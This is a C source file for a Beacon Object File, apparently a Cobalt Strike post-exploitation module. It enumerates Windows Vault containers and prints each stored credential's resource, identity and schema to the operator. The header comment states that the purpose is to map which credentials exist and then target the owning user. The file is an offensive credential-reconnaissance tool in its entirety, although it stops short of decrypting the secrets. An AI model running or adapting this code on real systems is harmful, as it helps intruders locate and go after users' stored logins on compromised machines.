/*
 * bof-vaultdump [vault-guid]
 *
 * Enumerate Windows Vault containers and items through vaultcli.dll.  Prints
 * the schema (Windows / Web / Certificate), friendly name, resource, identity
 * and last-modified time for every item.
 *
 * Protected item data is intentionally not decrypted here: Vault decryption
 * requires the user's vault keys and is done by the OS on demand.  Use this to
 * map what credentials exist and then target the owning user context.
 */
#include "beacon.h"
#include "bofdefs.h"
#include "helpers.h"

static const GUID bof_vault_web =
    {0x3ccd5499, 0x87a8, 0x4d10, {0xa2, 0x18, 0x82, 0x2e, 0xfc, 0x6a, 0xaf, 0x0c}};
static const GUID bof_vault_win =
    {0x2f1a6504, 0x0641, 0x44cf, {0x8b, 0xb5, 0x36, 0x12, 0xd8, 0x65, 0xf2, 0xe5}};
static const GUID bof_vault_cert =
    {0x3eba6b2b, 0xb4a5, 0x46f8, {0x9a, 0x37, 0x62, 0xc4, 0xf8, 0xa0, 0xb8, 0xf0}};

static int guid_eq(const GUID *a, const GUID *b)
{
    return bof_memcmp(a, b, sizeof(GUID)) == 0;
}

static const char *schema_name(const GUID *g)
{
    if (guid_eq(g, &bof_vault_web)) return "Web Credential";
    if (guid_eq(g, &bof_vault_win)) return "Windows Credential";
    if (guid_eq(g, &bof_vault_cert)) return "Certificate";
    return "Unknown";
}

static void guid_str(const GUID *g, char *out, int outsz)
{
    char t[64];
    bof_hex(g->Data1, 8, t);
    bof_strncpy(out, "{", outsz);
    bof_strncat(out, t, outsz - bof_strlen(out) - 1);
    bof_strncat(out, "-", outsz - bof_strlen(out) - 1);
    bof_hex(g->Data2, 4, t);
    bof_strncat(out, t, outsz - bof_strlen(out) - 1);
    bof_strncat(out, "-", outsz - bof_strlen(out) - 1);
    bof_hex(g->Data3, 4, t);
    bof_strncat(out, t, outsz - bof_strlen(out) - 1);
    bof_strncat(out, "-", outsz - bof_strlen(out) - 1);
    bof_hex(g->Data4[0], 2, t); bof_strncat(out, t, outsz - bof_strlen(out) - 1);
    bof_hex(g->Data4[1], 2, t); bof_strncat(out, t, outsz - bof_strlen(out) - 1);
    bof_strncat(out, "-", outsz - bof_strlen(out) - 1);
    bof_hex(g->Data4[2], 2, t); bof_strncat(out, t, outsz - bof_strlen(out) - 1);
    bof_hex(g->Data4[3], 2, t); bof_strncat(out, t, outsz - bof_strlen(out) - 1);
    bof_hex(g->Data4[4], 2, t); bof_strncat(out, t, outsz - bof_strlen(out) - 1);
    bof_hex(g->Data4[5], 2, t); bof_strncat(out, t, outsz - bof_strlen(out) - 1);
    bof_hex(g->Data4[6], 2, t); bof_strncat(out, t, outsz - bof_strlen(out) - 1);
    bof_hex(g->Data4[7], 2, t); bof_strncat(out, t, outsz - bof_strlen(out) - 1);
    bof_strncat(out, "}", outsz - bof_strlen(out) - 1);
}

/* Vault item string fields are DWORD_PTR; guard every dereference. */
static void wptr(const void *p, char *out, int outsz)
{
    out[0] = 0;
    if (!p || !bof_mem_readable(p)) return;
    if (!bof_mem_readable(*(void *const *)p)) return;
    bof_w2a((const wchar_t *)*(void *const *)p, out, outsz);
}

static void dump_item(const GUID *vault_guid, PBOF_VAULT_ITEM it, int idx)
{
    char friendly[256], resource[512], identity[256], when[32], sguid[64];
    unsigned long long ft;

    wptr((const void *)it->FriendlyName, friendly, sizeof(friendly));
    wptr((const void *)it->Resource, resource, sizeof(resource));
    wptr((const void *)it->Identity, identity, sizeof(identity));
    guid_str(&it->SchemaId, sguid, sizeof(sguid));

    ft = ((unsigned long long)it->LastModified.dwHighDateTime << 32) |
         it->LastModified.dwLowDateTime;
    bof_ft_str(ft, when, sizeof(when));

    BeaconPrintf(CALLBACK_OUTPUT, "\n  [%d] %s\n", idx + 1,
                 friendly[0] ? friendly : "(no friendly name)");
    BeaconPrintf(CALLBACK_OUTPUT, "      schema  : %s %s\n",
                 schema_name(&it->SchemaId), sguid);
    if (resource[0])
        BeaconPrintf(CALLBACK_OUTPUT, "      resource: %s\n", resource);
    if (identity[0])
        BeaconPrintf(CALLBACK_OUTPUT, "      identity: %s\n", identity);
    BeaconPrintf(CALLBACK_OUTPUT, "      modified: %s\n", when);
}

void go(char *args, int alen)
{
    datap parser;
    char *want = "";
    int wlen = 0, total = 0;
    int vcount = 0, i;
    GUID **vaults = NULL;

    BeaconDataParse(&parser, args, alen);
    want = BeaconDataExtract(&parser, &wlen);
    if (!want) want = "";

    if (VAULTCLI$VaultEnumerateVaults(0, &vcount, &vaults) != 0 || vcount <= 0) {
        BeaconPrintf(CALLBACK_ERROR, "VaultEnumerateVaults failed: %lu\n",
                     (unsigned long)KERNEL32$GetLastError());
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "================ Windows Vault ================\n");
    BeaconPrintf(CALLBACK_OUTPUT, "[*] %d vault(s)\n", vcount);

    for (i = 0; i < vcount; i++) {
        HANDLE h = NULL;
        PVOID items = NULL;
        int icount = 0, j;
        char vguid[64];
        GUID *vg = vaults[i];

        if (!vg || !bof_mem_readable(vg)) continue;
        guid_str(vg, vguid, sizeof(vguid));

        if (want[0] && bof_stricmp(want, vguid) != 0 &&
            bof_stricmp(want, schema_name(vg)) != 0)
            continue;

        if (VAULTCLI$VaultOpenVault(vg, 0, &h) != 0 || !h) {
            BeaconPrintf(CALLBACK_OUTPUT, "\n[*] vault %s: open failed\n", vguid);
            continue;
        }
        if (VAULTCLI$VaultEnumerateItems(h, 0, &icount, &items) != 0 || !items) {
            BeaconPrintf(CALLBACK_OUTPUT, "\n[*] vault %s: no items\n", vguid);
            VAULTCLI$VaultCloseVault(&h);
            continue;
        }

        BeaconPrintf(CALLBACK_OUTPUT, "\n=== vault %s: %d item(s) ===\n",
                     vguid, icount);
        for (j = 0; j < icount; j++) {
            PBOF_VAULT_ITEM it = (PBOF_VAULT_ITEM)
                ((unsigned char *)items + (unsigned int)j * sizeof(BOF_VAULT_ITEM));
            if (!bof_mem_readable(it)) break;
            dump_item(vg, it, j);
            total++;
        }

        VAULTCLI$VaultFree(items);
        VAULTCLI$VaultCloseVault(&h);
    }

    BeaconPrintf(CALLBACK_OUTPUT, "\n[*] %d item(s) listed; protected data not decrypted\n",
                 total);
}
